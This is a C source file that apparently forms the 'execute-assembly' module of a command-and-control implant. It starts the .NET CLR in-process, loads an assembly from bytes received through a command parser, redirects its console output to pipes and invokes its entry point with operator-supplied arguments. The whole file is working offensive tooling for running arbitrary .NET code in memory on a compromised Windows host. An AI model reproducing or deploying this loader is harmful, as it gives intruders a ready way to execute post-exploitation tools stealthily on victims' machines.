#include <InvokeAssembly.h>

extern HANDLE g_hPipeOut;
extern HANDLE g_hPipeErr;

GUID xCLSID_CLRMetaHost     = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

BOOL FindVersion( PVOID assembly, INT length )
{
    PCHAR assembly_c = (char*)assembly;

    CHAR v4[] = { 0x76, 0x34, 0x2E, 0x30, 0x2E, 0x33, 0x30, 0x33, 0x31, 0x39 };

    for ( INT i = 0; i < length; i++ )
    {
        for ( INT j = 0; j < 10; j++ )
        {
            if ( v4[ j ] != assembly_c[ i + j ] )
                break;
            else
            {
                if ( j == 9 )
                    return 1;
            }
        }
    }

    return 0;
}

VOID RedirectConsoleOutput( AppDomain* pDomain )
{
    Assembly*   pMscorlib    = NULL;
    Type*       pConsoleType = NULL;
    Type*       pSWType      = NULL;
    HRESULT     hr;
    LONG        zero         = 0;
    VARIANT     vEmpty       = { 0 };
    vEmpty.vt = VT_EMPTY;

    typedef HRESULT (STDMETHODCALLTYPE *fn_Load_2)( AppDomain*, BSTR, Assembly** );
    fn_Load_2 pfnLoad2 = (fn_Load_2) pDomain->lpVtbl->dummy_Load_2;

    BSTR bstr = SysAllocString( L"mscorlib" );
    hr = pfnLoad2( pDomain, bstr, &pMscorlib );
    SysFreeString( bstr );
    if ( hr != S_OK || ! pMscorlib ) return;

    bstr = SysAllocString( L"System.Console" );
    hr = pMscorlib->lpVtbl->GetType_2( pMscorlib, bstr, &pConsoleType );
    SysFreeString( bstr );
    if ( hr != S_OK || ! pConsoleType ) goto done;

    bstr = SysAllocString( L"System.IO.StreamWriter" );
    hr = pMscorlib->lpVtbl->GetType_2( pMscorlib, bstr, &pSWType );
    SysFreeString( bstr );
    if ( hr != S_OK || ! pSWType ) goto done;

    SAFEARRAY* pNoArgs = SafeArrayCreateVector( VT_VARIANT, 0, 0 );

    BSTR names[4];
    names[0] = SysAllocString( L"OpenStandardOutput" );
    names[1] = SysAllocString( L"OpenStandardError" );
    names[2] = SysAllocString( L"SetOut" );
    names[3] = SysAllocString( L"SetError" );

    for ( int ch = 0; ch < 2; ch++ )
    {
        VARIANT vStream = { 0 };
        hr = pConsoleType->lpVtbl->InvokeMember_3( pConsoleType, names[ch],
            BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public,
            NULL, vEmpty, pNoArgs, &vStream );
        if ( hr != S_OK ) continue;

        SAFEARRAY* pCtorArgs = SafeArrayCreateVector( VT_VARIANT, 0, 1 );
        SafeArrayPutElement( pCtorArgs, &zero, &vStream );
        VARIANT vWriter = { 0 };
        bstr = SysAllocString( L"" );
        hr = pSWType->lpVtbl->InvokeMember_3( pSWType, bstr,
            BindingFlags_CreateInstance | BindingFlags_Public | BindingFlags_Instance,
            NULL, vEmpty, pCtorArgs, &vWriter );
        SysFreeString( bstr );
        SafeArrayDestroy( pCtorArgs );
        if ( hr != S_OK ) continue;

        SAFEARRAY* pPropArgs = SafeArrayCreateVector( VT_VARIANT, 0, 1 );
        VARIANT vTrue = { 0 }; vTrue.vt = VT_BOOL; vTrue.boolVal = VARIANT_TRUE;
        SafeArrayPutElement( pPropArgs, &zero, &vTrue );
        VARIANT vDummy = { 0 };
        bstr = SysAllocString( L"AutoFlush" );
        pSWType->lpVtbl->InvokeMember_3( pSWType, bstr,
            BindingFlags_SetProperty | BindingFlags_Public | BindingFlags_Instance,
            NULL, vWriter, pPropArgs, &vDummy );
        SysFreeString( bstr );
        SafeArrayDestroy( pPropArgs );

        SAFEARRAY* pSetArgs = SafeArrayCreateVector( VT_VARIANT, 0, 1 );
        SafeArrayPutElement( pSetArgs, &zero, &vWriter );
        pConsoleType->lpVtbl->InvokeMember_3( pConsoleType, names[2 + ch],
            BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public,
            NULL, vEmpty, pSetArgs, &vDummy );
        SafeArrayDestroy( pSetArgs );
    }

    for ( int i = 0; i < 4; i++ ) SysFreeString( names[i] );
    SafeArrayDestroy( pNoArgs );

done:
    if ( pSWType )      pSWType->lpVtbl->Release( pSWType );
    if ( pConsoleType )  pConsoleType->lpVtbl->Release( pConsoleType );
    if ( pMscorlib )     pMscorlib->lpVtbl->Release( pMscorlib );
}

VOID InvokeAssembly( PPARSER DataArgs )
{
    INT     AppDomainNameSize           = 0;
    INT     NetVersionSize              = 0;
    INT     assemblyBytesLen            = 0;
    INT     ArgumentsLen                = 0;

    PUCHAR  AppDomainName               = ParserGetBytes( DataArgs, &AppDomainNameSize );
    PUCHAR  NetVersion                  = ParserGetBytes( DataArgs, &NetVersionSize );
    PUCHAR  assemblyBytes               = ParserGetBytes( DataArgs, &assemblyBytesLen );
    PUCHAR  Arguments                   = ParserGetBytes( DataArgs, &ArgumentsLen );

    WCHAR   wAppDomainName[ MAX_PATH ]  = { 0 };
    WCHAR   wNetVersion[ 20 ]           = { 0 };
    PWCHAR  wArguments                  = LocalAlloc( LPTR, ArgumentsLen * sizeof( WCHAR ) );

    // CLR & .Net Instances
    ICLRMetaHost*       pClrMetaHost        = { NULL };
    ICLRRuntimeInfo*    pClrRuntimeInfo     = { NULL };
    ICorRuntimeHost*    pICorRuntimeHost    = { NULL };
    Assembly*           pAssembly           = { NULL };
    IUnknown*           pAppDomainThunk     = { NULL };
    AppDomain*          pAppDomain          = { NULL };
    MethodInfo*         pMethodInfo         = { NULL };
    VARIANT             vtPsa               = { 0 };
    LPVOID              pvData              = { NULL };

    VARIANT retVal  = { 0 };
    VARIANT obj     = { 0 };


    // Convert Ansi Strings to Wide Strings
    CharStringToWCharString( wAppDomainName, AppDomainName, AppDomainNameSize );
    CharStringToWCharString( wNetVersion, NetVersion, NetVersionSize );
    CharStringToWCharString( wArguments, Arguments, ArgumentsLen );

    if ( assemblyBytes == NULL || assemblyBytesLen == 0 ) {
        Instance.Win32.printf( "[-] No assembly data received\n" );
        return;
    }

    // Hosting CLR
    if ( ! W32CreateClrInstance( wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost ) )
    {
        Instance.Win32.printf( "[-] Couldn't start CLR\n" );
        return;
    }

    SAFEARRAYBOUND rgsabound[1] = { 0 };
    rgsabound[0].cElements = assemblyBytesLen;
    rgsabound[0].lLbound = 0;
    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);

    if ( ! pSafeArray ) {
        Instance.Win32.printf( "[-] SafeArrayCreate failed\n" );
        goto Cleanup;
    }

    HRESULT hr;

    hr = pICorRuntimeHost->lpVtbl->CreateDomain( pICorRuntimeHost, wAppDomainName, NULL, &pAppDomainThunk );
    if ( hr != S_OK ) {
        Instance.Win32.printf( "[-] CreateDomain failed (0x%08X)\n", (unsigned int)hr );
        goto Cleanup;
    }

    hr = pAppDomainThunk->lpVtbl->QueryInterface( pAppDomainThunk, &xIID_AppDomain, &pAppDomain );
    if ( hr != S_OK ) {
        Instance.Win32.printf( "[-] QueryInterface failed (0x%08X)\n", (unsigned int)hr );
        goto Cleanup;
    }

    hr = SafeArrayAccessData( pSafeArray, &pvData );
    if ( hr != S_OK ) {
        Instance.Win32.printf( "[-] SafeArrayAccessData failed (0x%08X)\n", (unsigned int)hr );
        goto Cleanup;
    }

    MemCopy(pvData, assemblyBytes, assemblyBytesLen);

    hr = SafeArrayUnaccessData( pSafeArray );
    if ( hr != S_OK )
        Instance.Win32.printf("[-] SafeArrayUnaccessData failed (0x%08X)\n", (unsigned int)hr);

    hr = pAppDomain->lpVtbl->Load_3( pAppDomain, pSafeArray, &pAssembly );
    if ( hr != S_OK ) {
        Instance.Win32.printf( "[-] Load_3 failed (0x%08X)\n", (unsigned int)hr );
        goto Cleanup;
    }

    if ( pAssembly->lpVtbl->EntryPoint( pAssembly, &pMethodInfo ) != S_OK ) {
        Instance.Win32.printf( "[-] EntryPoint retrieval failed\n" );
        goto Cleanup;
    }

    obj.vt = VT_NULL;

    SAFEARRAY* psaStaticMethodArgs = SafeArrayCreateVector( VT_VARIANT, 0, 1 );

    int     argumentCount;
    LPWSTR* argumentsArray = CommandLineToArgvW( wArguments, &argumentCount );

    argumentsArray++;
    argumentCount--;

    vtPsa.vt = ( VT_ARRAY | VT_BSTR );
    vtPsa.parray = SafeArrayCreateVector( VT_BSTR, 0, argumentCount );

    for ( LONG i = 0; i < argumentCount; i++ )
        SafeArrayPutElement( vtPsa.parray, &i, SysAllocString( argumentsArray[ i ] ) );

    long idx[1] = { 0 };
    SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

    /* Ensure STD_OUTPUT_HANDLE points to the pipe, not the console.
     * CLR init may have changed it. */
    if ( g_hPipeOut && g_hPipeOut != INVALID_HANDLE_VALUE )
        SetStdHandle( (DWORD)-11, g_hPipeOut );
    if ( g_hPipeErr && g_hPipeErr != INVALID_HANDLE_VALUE )
        SetStdHandle( (DWORD)-12, g_hPipeErr );

    RedirectConsoleOutput( pAppDomain );

    if ( pMethodInfo->lpVtbl->Invoke_3( pMethodInfo, obj, psaStaticMethodArgs, &retVal ) != S_OK ) {
        Instance.Win32.printf( "[-] Invoke_3 failed\n" );
        goto Cleanup;
    }


Cleanup:
    if ( NULL != psaStaticMethodArgs )
    {
        SafeArrayDestroy( psaStaticMethodArgs );
        psaStaticMethodArgs = NULL;
    }

    if ( pMethodInfo != NULL )
    {
        pMethodInfo->lpVtbl->Release( pMethodInfo );
        pMethodInfo = NULL;
    }

    if ( pAssembly != NULL )
    {
        pAssembly->lpVtbl->Release( pAssembly );
        pAssembly = NULL;
    }

    if (pAppDomain != NULL)
    {
        pAppDomain->lpVtbl->Release( pAppDomain );
        pAppDomain = NULL;
    }

    if ( pAppDomainThunk != NULL )
        pAppDomainThunk->lpVtbl->Release( pAppDomainThunk );

    if ( pICorRuntimeHost != NULL )
    {
        pICorRuntimeHost->lpVtbl->UnloadDomain( pICorRuntimeHost, pAppDomainThunk );
        pICorRuntimeHost->lpVtbl->Stop( pICorRuntimeHost );
        pICorRuntimeHost = NULL;
    }

    if ( pClrRuntimeInfo != NULL )
    {
        pClrRuntimeInfo->lpVtbl->Release( pClrRuntimeInfo );
        pClrRuntimeInfo = NULL;
    }

    if ( pClrMetaHost != NULL )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }
}

BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
{
    BOOL fLoadable = FALSE;

    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
    {
        if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
        {
            if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
            {
                //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, ppICorRuntimeHost ) == S_OK )
                {
                    //Start it. This is okay to call even if the CLR is already running
                    ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
                }
                else
                {
                    Instance.Win32.printf("[-] GetInterface failed for %ls CLR version\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                Instance.Win32.printf("[-] IsLoadable failed for %ls CLR version\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            Instance.Win32.printf("[-] GetRuntime failed for %ls CLR version\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        Instance.Win32.printf("[-] CLRCreateInstance failed for %ls CLR version\n", dotNetVersion);
        return 0;
    }

    return 1;
}
